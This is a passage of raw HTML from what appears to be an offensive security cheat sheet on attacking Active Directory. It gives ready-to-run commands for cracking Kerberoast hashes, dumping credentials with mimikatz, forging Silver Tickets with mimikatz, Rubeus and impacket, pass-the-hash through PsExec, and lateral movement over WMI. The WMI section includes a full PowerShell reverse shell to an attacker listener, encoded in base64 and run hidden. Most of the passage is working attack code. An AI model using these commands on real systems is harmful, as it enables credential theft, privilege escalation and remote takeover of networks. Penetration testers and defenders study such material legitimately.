hashcat\u003c/span\u003e\nhashcat -m 13100 --force -r /usr/share/hashcat/rules/best64.rule kerberoast.hash /usr/share/wordlists/rockyou.txt\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIf the SPN runs in the context of a computer account, a managed service account, or a group-managed service account, the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. The same is true for the \u003ccode\u003ekrbtgt\u003c/code\u003e user account which acts as service account for the KDC.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eIf you have write permissions for another user account (e.g. \u003ccode\u003eGenericAll\u003c/code\u003e), then, instead of changing their password, you could momentarily add/register an SPN to their account, allowing you to kerberoast them.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eOnce you have the SPN password, you can use it to forge a Silver Ticket. You must first convert it to its NTLM hash, which is simply the MD4 hash of the password.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-python notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"import hashlib\nh = hashlib.new(\u0026quot;md4\u0026quot;, \u0026quot;SPN_PASSWORD\u0026quot;.encode(\u0026quot;utf-16le\u0026quot;)).hexdigest()\nprint(h)\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003eimport\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ehashlib\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003eh\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003ehashlib\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003enew\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\"md4\"\u003c/span\u003e, \u003cspan class=\"pl-s\"\u003e\"SPN_PASSWORD\"\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eencode\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\"utf-16le\"\u003c/span\u003e)).\u003cspan class=\"pl-c1\"\u003ehexdigest\u003c/span\u003e()\n\u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eh\u003c/span\u003e)\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5.2.5 Silver Ticket\u003c/h3\u003e\u003ca id=\"user-content-525-silver-ticket\" class=\"anchor\" aria-label=\"Permalink: 5.2.5 Silver Ticket\" href=\"#525-silver-ticket\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eA Silver Ticket is a forged service ticket that an attacker uses to gain access to a service.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003ePrivileged Account Certificate (PAC) validation is an optional verification process between the SPN application and the DC. If this is enabled, the user authenticating to the service and its privileges are validated by the DC. Fortunately for this attack technique, service applications rarely perform PAC validation.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThat means that an attacker with the SPN password (see \u003ca href=\"#5.2.4%20Kerberoasting\"\u003eKerberoasting\u003c/a\u003e) or its NTLM hash can forge a service ticket for any user with whatever group memberships and permissions the attacker desires, and the SPN will commonly blindly trust those permissions rather than verify them with the DC.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eWe need to collect the following three pieces of information to create a silver ticket:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eSPN password hash (can get with mimikatz when SPN has session on your computer)\u003c/li\u003e\n\u003cli\u003eDomain SID (extract from user SID)\u003c/li\u003e\n\u003cli\u003eTarget SPN\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eMore info: \u003ca href=\"https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket\" rel=\"nofollow\"\u003eHackTricks - Silver Ticket\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eGetting prerequisite info:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# use mimikatz to get SPN NTLM hash\nmimikatz.exe\n\u0026gt; privilege::debug\n\u0026gt; sekurlsa::logonpasswords\n\n# extract the Domain SID from the user SID (everything but RID, numbers after last dash)\nwhoami /user\n\n# list SPNs from specific host\nsetspn -l HOSTNAME\n# example for IIS server: HTTP/web04.corp.com:80\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e use mimikatz to get SPN NTLM hash\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003emimikatz.exe\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e privilege::debug\n\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e sekurlsa::logonpasswords\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e extract the Domain SID from the user SID (everything but RID, numbers after last dash)\u003c/span\u003e\nwhoami \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003euser\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list SPNs from specific host\u003c/span\u003e\nsetspn \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003el HOSTNAME\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e example for IIS server: HTTP/web04.corp.com:80\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eCreate silver ticket (you can use any valid username):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# in mimikatz:\n# /ptt - pass the ticket; auto-injects it into memory\nkerberos::golden /sid:S-1-5-... /domain:DOMAIN /ptt /target:SERVER_FQDN /service:http /rc4:NTLM_HASH /user:ADMIN_USER\n\n# TODO: figure out how to do this with Rubeus.exe\n# Rubeus lets you ask for tickets for all services at once:\n# /altservice:host,rpcss,http,wsman,cifs,ldap,krbtgt,winrm\n.\\Rubeus.exe silver /rc4:NTHASH /user:USERNAME /service:SPN /ldap /ptt [/altservice:host,rpcss,http,wsman,cifs,ldap,krbtgt,winrm] [/nofullpacsig] [outfile:FILENAME]\n\n# Kali: get SIDs with crackmapexec\ncrackmapexec ldap DC_FQDN -u USERNAME -p PASSWORD -k --get-sid\n\n# Kali: use impacket\n# Service is something like http, cifs, host, ldap, etc. (cifs lets you access files)\nimpacket-lookupsid DOMAIN/USERNAME:PASSWORD@VICTIM\nimpacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-.... -domain DOMAIN -spn SERVICE/VICTIM_FQDN USERNAME\nexport KRB5CCNAME=$(pwd)/USERNAME.ccache \nimpacket-psexec DOMAIN/USERNAME@VICTIM -k -no-pass\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e in mimikatz:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e /ptt - pass the ticket; auto-injects it into memory\u003c/span\u003e\nkerberos::golden \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003esid:S\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e5\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003e..\u003cspan class=\"pl-k\"\u003e.\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003edomain:DOMAIN \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eptt \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003etarget:SERVER_FQDN \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eservice:http \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003erc4:NTLM_HASH \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003euser:ADMIN_USER\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e TODO: figure out how to do this with Rubeus.exe\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Rubeus lets you ask for tickets for all services at once:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e /altservice:host,rpcss,http,wsman,cifs,ldap,krbtgt,winrm\u003c/span\u003e\n.\\\u003cspan class=\"pl-c1\"\u003eRubeus.exe\u003c/span\u003e silver \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003erc4:NTHASH \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003euser:USERNAME \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eservice:SPN \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eldap \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eptt [\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-k\"\u003ealtservice\u003c/span\u003e:\u003cspan class=\"pl-k\"\u003ehost\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-k\"\u003erpcss\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-k\"\u003ehttp\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-k\"\u003ewsman\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-k\"\u003ecifs\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-k\"\u003eldap\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-k\"\u003ekrbtgt\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-k\"\u003ewinrm\u003c/span\u003e] [\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-k\"\u003enofullpacsig\u003c/span\u003e] [\u003cspan class=\"pl-k\"\u003eoutfile\u003c/span\u003e:\u003cspan class=\"pl-k\"\u003eFILENAME\u003c/span\u003e]\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Kali: get SIDs with crackmapexec\u003c/span\u003e\ncrackmapexec ldap DC_FQDN \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eu USERNAME \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ep PASSWORD \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ek \u003cspan class=\"pl-k\"\u003e--\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eget-sid\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Kali: use impacket\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Service is something like http, cifs, host, ldap, etc. (cifs lets you access files)\u003c/span\u003e\nimpacket\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003elookupsid DOMAIN\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eUSERNAME:PASSWORD\u003cspan class=\"pl-smi\"\u003e@VICTIM\u003c/span\u003e\nimpacket\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eticketer \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003enthash NTHASH \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003edomain\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003esid S\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e5\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e21\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003e...\u003cspan class=\"pl-k\"\u003e.\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003edomain DOMAIN \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003espn SERVICE\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eVICTIM_FQDN USERNAME\nexport KRB5CCNAME\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e$\u003c/span\u003e(pwd)\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eUSERNAME.ccache \nimpacket\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003epsexec DOMAIN\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eUSERNAME\u003cspan class=\"pl-smi\"\u003e@VICTIM\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ek \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eno\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003epass\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eConfirm ticket is loaded in memory on Windows host:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# list kerberos tickets available to user\nklist\n\n# make web request with silver ticket\niwr -UseDefaultCredentials http://VICTIM\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list kerberos tickets available to user\u003c/span\u003e\nklist\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e make web request with silver ticket\u003c/span\u003e\niwr \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eUseDefaultCredentials http:\u003cspan class=\"pl-k\"\u003e//\u003c/span\u003eVICTIM\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eBefore 11 October 2022, it was possible to forge Silver tickets for nonexistent users. That's no longer the case, due to a security patch that adds the \u003ccode\u003ePAC_REQUESTOR\u003c/code\u003e field to the Privilege Attribute Certificate (PAC) structure. The field contains the username, and it is required to be validated by the DC (when patch is enforced).\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5.3 Lateral Movement in Active Directory\u003c/h2\u003e\u003ca id=\"user-content-53-lateral-movement-in-active-directory\" class=\"anchor\" aria-label=\"Permalink: 5.3 Lateral Movement in Active Directory\" href=\"#53-lateral-movement-in-active-directory\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003ePass-the-Hash (PtH) only works for servers using NTLM authentication (not Kerberos only). Authentication is performed using an SMB connection, so port 445 must be open, the Windows File and Printer Sharing feature to be enabled (it is by default), and the \u003ccode\u003eADMIN$\u003c/code\u003e share to be available. It also requires local administrator rights. Most tools that are built to abuse PtH can be leveraged to start a Windows service (for example, cmd.exe or an instance of PowerShell) and communicate with it using Named Pipes. This is done using the Service Control Manager API.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5.3.1 PsExec on Active Directory\u003c/h3\u003e\u003ca id=\"user-content-531-psexec-on-active-directory\" class=\"anchor\" aria-label=\"Permalink: 5.3.1 PsExec on Active Directory\" href=\"#531-psexec-on-active-directory\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003ePsExec allows you to run remote processes as a child of a Windows service process, meaning you get SYSTEM privileges.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003ePrerequisites: The user that authenticates to the target machine needs to be part of the \u003cem\u003eAdministrators\u003c/em\u003e local group. In addition, the \u003cem\u003eADMIN$\u003c/em\u003e share must be available and File and Printer Sharing must be turned on (this is default).\u003c/p\u003e\n\u003cp dir=\"auto\"\u003ePsExec is part of the Sysinternals suite, and performs the following tasks:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eWrites \u003ccode\u003epsexesvc.exe\u003c/code\u003e into the \u003ccode\u003eC:\\Windows\u003c/code\u003e directory\u003c/li\u003e\n\u003cli\u003eCreates and spawns a service on the remote host\u003c/li\u003e\n\u003cli\u003eRuns the requested program/command as a child process of \u003ccode\u003epsexesvc.exe\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eUsing Sysinternals PsExec for remote interactive session (from windows host):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# interactive shell using sysinternals version of psexec\n./PsExec64.exe -accepteula -i  \\\\VICTIM -u DOMAIN\\ADMINUSER -p PASSWORD cmd\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e interactive shell using sysinternals version of psexec\u003c/span\u003e\n.\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003ePsExec64.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eaccepteula \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ei  \\\\VICTIM \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eu DOMAIN\\ADMINUSER \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ep PASSWORD cmd\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eUsing \u003ccode\u003eimpacket-psexec\u003c/code\u003e from Kali, pass-the-hash is possible:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# spawns interactive shell as SYSTEM\nimpacket-psexec -hashes :NTHASH ADMINUSER@VICTIM_IP\n\n# with password authentication:\nimpacket-psexec 'ADMINUSER:PASSWORD@VICTIM_IP'\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e spawns interactive shell as SYSTEM\u003c/span\u003e\nimpacket-psexec -hashes :NTHASH ADMINUSER@VICTIM_IP\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e with password authentication:\u003c/span\u003e\nimpacket-psexec \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eADMINUSER:PASSWORD@VICTIM_IP\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5.3.2 WMI and WinRM on Active Directory\u003c/h3\u003e\u003ca id=\"user-content-532-wmi-and-winrm-on-active-directory\" class=\"anchor\" aria-label=\"Permalink: 5.3.2 WMI and WinRM on Active Directory\" href=\"#532-wmi-and-winrm-on-active-directory\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eWMI and WinRM both require plaintext credentials when executed from Windows (hashes are sufficient from Linux with impacket), and they both allow running commands as an administrator on a remote machine.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003eWindows Management Instrumentation (WMI)\u003c/em\u003e is capable of creating processes via the \u003ccode\u003eCreate\u003c/code\u003e method from the \u003ccode\u003eWin32_Process\u003c/code\u003e class. It communicates through \u003cem\u003eRemote Procedure Calls (RPC)\u003c/em\u003e over port 135 for remote access. In order to create a process on the remote target via WMI, we need (plaintext credentials of a member of the \u003cem\u003eAdministrators\u003c/em\u003e local group. The nice thing about WMI for lateral movement is that UAC remote access restrictions don't apply for domain users on domain-joined machines, so we can leverage full privileges.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eAbusing WMI for lateral movement (from Windows):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# create remote process with legacy tool: wmic\nwmic /node:VICTIM_IP /user:LOCALADMIN /password:PASSWORD process call create \u0026quot;calc.exe\u0026quot;\n\n# create remote process with PowerShell's WMI\n# variable declaration\n$username = 'LOCALADMIN';\n$password = 'PASSWORD';\n$victim = 'VICTIM'\n$lhost = 'LISTEN_IP'\n$lport = 443\n$revshell = '$client=New-Object System.Net.Sockets.TCPClient(\u0026quot;'+$lhost+'\u0026quot;,'+$lport+');$stream = $client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2\u0026gt;\u0026amp;1|Out-String );$sendback2=$sendback+\u0026quot;PS \u0026quot;+(pwd).Path+\u0026quot;\u0026gt;\u0026quot;;$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()';\n$b64cmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($revshell));\n$command = 'powershell -ep bypass -nop -w hidden -enc '+$b64cmd;\n# requires PSCredential object to hold creds\n$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;\n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;\n# then create Common Information Model (CIM) session object with DCOM protocol\n# (i.e. WMI session)\n$options = New-CimSessionOption -Protocol DCOM\n$session = New-CimSession -ComputerName $victim -Credential $credential -SessionOption $options\n# Invoke Create method of Win32_Process\nInvoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$command};\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create remote process with legacy tool: wmic\u003c/span\u003e\nwmic \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003enode:VICTIM_IP \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003euser:LOCALADMIN \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003epassword:PASSWORD \u003cspan class=\"pl-k\"\u003eprocess\u003c/span\u003e call create \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ecalc.exe\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create remote process with PowerShell's WMI\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e variable declaration\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$username\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eLOCALADMIN\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-smi\"\u003e$password\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ePASSWORD\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-smi\"\u003e$victim\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eVICTIM\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$lhost\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eLISTEN_IP\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$lport\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e443\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$revshell\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e$client=New-Object System.Net.Sockets.TCPClient(\"\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$lhost\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\",\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e\u003cspan 